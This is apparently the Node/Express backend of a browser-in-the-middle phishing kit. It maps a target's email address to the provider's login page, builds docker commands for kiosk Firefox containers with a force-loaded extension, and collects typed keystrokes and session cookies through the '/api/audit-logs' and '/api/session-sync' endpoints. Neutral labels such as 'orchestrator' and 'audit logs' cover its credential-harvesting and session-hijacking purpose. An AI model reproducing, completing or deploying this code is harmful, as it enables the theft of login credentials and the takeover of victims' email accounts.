import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import Database from "better-sqlite3";
import { fileURLToPath } from "url";
import dns from "dns";
import { promisify } from "util";
import { createServer } from "http";
import { WebSocketServer, WebSocket } from "ws";

const resolveMx = promisify(dns.resolveMx);

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

async function startServer() {
  const app = express();
  const PORT = process.env.PORT || 3000;

  // Initialize Database
  let db: Database.Database;
  try {
    db = new Database("orchestrator.db");
  } catch (err) {
    console.error("[Orchestrator] Failed to initialize database:", err);
    // Fallback to in-memory if persistent DB fails
    db = new Database(":memory:");
  }
  db.exec(`
    CREATE TABLE IF NOT EXISTS domains (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      domain TEXT UNIQUE,
      login_url TEXT
    );
    CREATE TABLE IF NOT EXISTS containers (
      id TEXT PRIMARY KEY,
      name TEXT,
      email TEXT,
      domain TEXT,
      login_url TEXT,
      status TEXT,
      ip_address TEXT,
      remote_url TEXT,
      last_active DATETIME DEFAULT CURRENT_TIMESTAMP,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    );
    CREATE TABLE IF NOT EXISTS scaling_metrics (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      total_cpu REAL,
      total_memory REAL,
      active_containers INTEGER,
      strategy TEXT,
      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    );
    CREATE TABLE IF NOT EXISTS audit_logs (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      container_id TEXT,
      type TEXT,
      content TEXT,
      url TEXT,
      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    );
    CREATE TABLE IF NOT EXISTS captured_sessions (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      container_id TEXT,
      cookie_name TEXT,
      cookie_value TEXT,
      domain TEXT,
      raw_json TEXT,
      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    );
    CREATE TABLE IF NOT EXISTS firewall_rules (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      source_ip TEXT,
      action TEXT CHECK(action IN ('ALLOW', 'DROP')),
      description TEXT,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    );
    CREATE TABLE IF NOT EXISTS ops_chat (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id TEXT,
      username TEXT,
      message TEXT,
      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    );
  `);

  // Seed default data if empty
  const count = db.prepare("SELECT count(*) as count FROM domains").get() as { count: number };
  if (count.count === 0) {
    const insert = db.prepare("INSERT INTO domains (domain, login_url) VALUES (?, ?)");
    insert.run("gmail.com", "https://accounts.google.com");
    insert.run("outlook.com", "https://login.live.com");
    insert.run("yahoo.com", "https://login.yahoo.com");
    insert.run("icloud.com", "https://www.icloud.com");
    insert.run("protonmail.com", "https://account.proton.me/login");
  }

  const firewallCount = db.prepare("SELECT count(*) as count FROM firewall_rules").get() as { count: number };
  if (firewallCount.count === 0) {
    const insert = db.prepare("INSERT INTO firewall_rules (source_ip, action, description) VALUES (?, ?, ?)");
    insert.run("0.0.0.0/0", "ALLOW", "Default allow all intra-cluster traffic");
    insert.run("192.168.1.100", "DROP", "Restricted external operator");
  }

  const server = createServer(app);
  const wss = new WebSocketServer({ server });

  // WebSocket Chat Logic
  wss.on("connection", (ws) => {
    console.log("[WS] New connection established");
    
    // Send latest messages on connect
    const history = db.prepare("SELECT * FROM ops_chat ORDER BY timestamp ASC LIMIT 50").all();
    ws.send(JSON.stringify({ type: "history", data: history }));

    ws.on("message", (raw) => {
      try {
        const payload = JSON.parse(raw.toString());
        if (payload.type === "message") {
          const { user_id, username, message } = payload.data;
          
          const stmt = db.prepare(`
            INSERT INTO ops_chat (user_id, username, message)
            VALUES (?, ?, ?)
          `);
          const info = stmt.run(user_id, username, message);
          
          const newMessage = {
            id: info.lastInsertRowid,
            user_id,
            username,
            message,
            timestamp: new Date().toISOString()
          };

          // Broadcast to everyone
          const broadcastPayload = JSON.stringify({ type: "message", data: newMessage });
          wss.clients.forEach((client) => {
            if (client.readyState === WebSocket.OPEN) {
              client.send(broadcastPayload);
            }
          });
        }
      } catch (err) {
        console.error("[WS] Error processing message:", err);
      }
    });
  });

  // Background Scaling Manager
  setInterval(() => {
    // 1. Calculate Simulated System Metrics
    const active = db.prepare("SELECT count(*) as count FROM containers WHERE status = 'running'").get() as { count: number };
    const simulatedCpu = Math.min(95, active.count * 15 + (Math.random() * 5));
    const simulatedMem = Math.min(16000, active.count * 512 + (Math.random() * 200));

    db.prepare(`
      INSERT INTO scaling_metrics (total_cpu, total_memory, active_containers, strategy)
      VALUES (?, ?, ?, ?)
    `).run(simulatedCpu, simulatedMem, active.count, simulatedCpu > 80 ? 'THROTTLING' : 'OPTIMIZED');

    // 2. Idle Reaper (Scale Down)
    // Containers with no activity for > 5 minutes are terminated
    const idleLimitMinutes = 5;
    const idleContainers = db.prepare(`
      SELECT id FROM containers 
      WHERE status = 'running' 
      AND last_active < DATETIME('now', '-${idleLimitMinutes} minutes')
    `).all() as { id: string }[];

    idleContainers.forEach(container => {
      console.log(`[ScalingManager] Auto-terminating idle container (IDLE > ${idleLimitMinutes}m): ${container.id}`);
      db.prepare("UPDATE containers SET status = 'terminated' WHERE id = ?").run(container.id);
    });
  }, 30000); // Check every 30 seconds

  app.use(express.json());

  app.get("/api/health", (req, res) => {
    res.json({ 
      status: "ok", 
      time: new Date().toISOString(),
      env: process.env.NODE_ENV || "development",
      port: PORT
    });
  });

  app.get("/api/firewall-rules", (req, res) => {
    const rules = db.prepare("SELECT * FROM firewall_rules ORDER BY created_at DESC").all();
    const protocol = req.headers["x-forwarded-proto"] === "https" ? "https" : "http";
    res.json(rules);
  });

  app.post("/api/firewall-rules", (req, res) => {
    const { source_ip, action, description } = req.body;
    if (!source_ip || !action) return res.status(400).json({ error: "Source IP and Action are required" });
    
    // Simulate applying iptables command
    const ipt_cmd = `iptables -A DOCKER-USER -s ${source_ip} -j ${action}`;
    console.log(`[Firewall] Executing: ${ipt_cmd}`);

    db.prepare(`
      INSERT INTO firewall_rules (source_ip, action, description)
      VALUES (?, ?, ?)
    `).run(source_ip, action, description || "");
    res.json({ success: true, command: ipt_cmd });
  });

  app.delete("/api/firewall-rules/:id", (req, res) => {
    const { id } = req.params;
    const rule = db.prepare("SELECT * FROM firewall_rules WHERE id = ?").get(id) as any;
    if (rule) {
      const ipt_cmd = `iptables -D DOCKER-USER -s ${rule.source_ip} -j ${rule.action}`;
      console.log(`[Firewall] Reverting: ${ipt_cmd}`);
    }
    db.prepare("DELETE FROM firewall_rules WHERE id = ?").run(id);
    res.json({ success: true });
  });

  // API Routes
  app.get("/api/domains", (req, res) => {
    const domains = db.prepare("SELECT * FROM domains ORDER BY domain ASC").all();
    res.json(domains);
  });

  app.post("/api/domains", (req, res) => {
    const { domain, login_url } = req.body;
    if (!domain || !login_url) {
      return res.status(400).json({ error: "Domain and Login URL are required" });
    }
    try {
      const info = db.prepare("INSERT INTO domains (domain, login_url) VALUES (?, ?)").run(domain, login_url);
      res.json({ id: info.lastInsertRowid, domain, login_url });
    } catch (err) {
      res.status(400).json({ error: "Domain already exists or database error" });
    }
  });

  app.delete("/api/domains/:id", (req, res) => {
    const { id } = req.params;
    db.prepare("DELETE FROM domains WHERE id = ?").run(id);
    res.json({ success: true });
  });

  app.get("/api/containers", (req, res) => {
    const containers = db.prepare("SELECT * FROM containers ORDER BY created_at DESC").all();
    res.json(containers);
  });

  app.get("/api/audit-logs", (req, res) => {
    const logs = db.prepare("SELECT * FROM audit_logs ORDER BY timestamp DESC LIMIT 100").all();
    res.json(logs);
  });

  app.post("/api/audit-logs", (req, res) => {
    const { key, char, url, title, container_id } = req.body || {};
    const targetId = container_id || 'active_session';
    
    db.prepare(`
      INSERT INTO audit_logs (container_id, type, content, url)
      VALUES (?, ?, ?, ?)
    `).run(targetId, 'keypress', char || key, url);

    // Heartbeat the container activity
    if (targetId !== 'active_session') {
      db.prepare("UPDATE containers SET last_active = CURRENT_TIMESTAMP WHERE id = ?").run(targetId);
    }
    
    res.status(204).send();
  });

  app.get("/api/captured-sessions", (req, res) => {
    const sessions = db.prepare("SELECT * FROM captured_sessions ORDER BY timestamp DESC LIMIT 100").all();
    res.json(sessions);
  });

  app.post("/api/session-sync", express.json(), (req, res) => {
    const cookie = req.body;
    if (!cookie || !cookie.name) return res.status(400).send();
    
    const container_id = cookie.container_id || 'unknown';
    db.prepare(`
      INSERT INTO captured_sessions (container_id, cookie_name, cookie_value, domain, raw_json)
      VALUES (?, ?, ?, ?, ?)
    `).run(
      container_id,
      cookie.name,
      cookie.value,
      cookie.domain,
      JSON.stringify(cookie)
    );

    // Heartbeat
    if (container_id !== 'unknown') {
      db.prepare("UPDATE containers SET last_active = CURRENT_TIMESTAMP WHERE id = ?").run(container_id);
    }

    res.status(204).send();
  });

  app.post("/api/containers/:id/restart", (req, res) => {
    const { id } = req.params;
    db.prepare("UPDATE containers SET status = 'running' WHERE id = ?").run(id);
    console.log(`[Orchestrator] Restarting container: ${id}`);
    res.json({ success: true });
  });

  app.post("/api/containers/:id/terminate", (req, res) => {
    const { id } = req.params;
    db.prepare("UPDATE containers SET status = 'terminated' WHERE id = ?").run(id);
    console.log(`[Orchestrator] Terminating container: ${id}`);
    res.json({ success: true });
  });

  const getLoginUrlFromMx = async (domain: string): Promise<string | null> => {
    try {
      const addresses = await resolveMx(domain);
      const providers = [
        { pattern: /\.google\.com$/i, url: "https://accounts.google.com" },
        { pattern: /\.outlook\.com$/i, url: "https://login.live.com" },
        { pattern: /\.pphosted\.com$/i, url: "https://login.microsoftonline.com" }, // Often M365
        { pattern: /\.yahoo\.com$/i, url: "https://login.yahoo.com" },
        { pattern: /\.secureserver\.net$/i, url: "https://sso.godaddy.com" },
        { pattern: /\.zoho\.com$/i, url: "https://mail.zoho.com" },
        { pattern: /\.protonmail\.ch$/i, url: "https://account.proton.me/login" },
      ];

      for (const addr of addresses) {
        for (const provider of providers) {
          if (provider.pattern.test(addr.exchange)) {
            return provider.url;
          }
        }
      }
    } catch (e) {
      console.error(`MX lookup failed for ${domain}:`, e);
    }
    return null;
  };

  app.post("/api/launch-browser", async (req, res) => {
    const { email } = req.body;
    if (!email || typeof email !== "string") {
      return res.status(400).json({ error: "Email is required" });
    }

    const domain = email.split("@")[1];
    if (!domain) {
      return res.status(400).json({ error: "Invalid email format" });
    }

    // 1. Check local DB registry first
    const row = db.prepare("SELECT login_url FROM domains WHERE domain = ?").get(domain) as { login_url: string } | undefined;
    
    let login_url = row?.login_url;

    // 2. If not in DB, perform MX lookup
    if (!login_url) {
      console.log(`[Orchestrator] Performing MX lookup for: ${domain}`);
      login_url = await getLoginUrlFromMx(domain) || undefined;
    }

    // 3. Fallback to generic search if both failed
    if (!login_url) {
      login_url = "https://www.google.com/search?q=login+for+" + domain;
    }

    const containerId = `container_${Math.random().toString(36).substring(7)}`;
    const containerName = `firefox_${domain}_${Math.random().toString(36).substring(7)}`;
    const port = 6000 + Math.floor(Math.random() * 1000);
    const remoteUrl = `http://localhost:${port}`;
    const ipAddress = `172.17.0.${Math.floor(Math.random() * 254) + 1}`;

    // Firefox policies to force-load the extension
    // We already created /distribution/policies.json
    
    const docker_command = `docker run -d \\
  --name ${containerName} \\
  -p ${port}:5800 \\
  -v ${path.join(process.cwd(), 'extension')}:/extension:ro \\
  -v ${path.join(process.cwd(), 'distribution', 'policies.json')}:/usr/lib/firefox/distribution/policies.json:ro \\
  -e APP_ARGS="--kiosk ${login_url}" \\
  jlesage/firefox:latest`;

    // Persist container
    db.prepare(`
      INSERT INTO containers (id, name, email, domain, login_url, status, ip_address, remote_url, last_active)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
    `).run(containerId, containerName, email, domain, login_url, "running", ipAddress, remoteUrl);

    // Simulate "starting container" logic
    console.log(`[Orchestrator] Executing: ${docker_command}`);

    res.json({
      success: true,
      email,
      domain,
      login_url,
      docker_command,
      container_id: containerId,
      status: "running",
      ip_address: ipAddress,
      remote_url: remoteUrl
    });
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.get("/api/scaling-metrics", (req, res) => {
    const metrics = db.prepare("SELECT * FROM scaling_metrics ORDER BY timestamp DESC LIMIT 50").all();
    res.json(metrics);
  });

  server.listen(Number(PORT), "0.0.0.0", () => {
    console.log(`Server running on port ${PORT} (0.0.0.0)`);
  });
}

startServer();
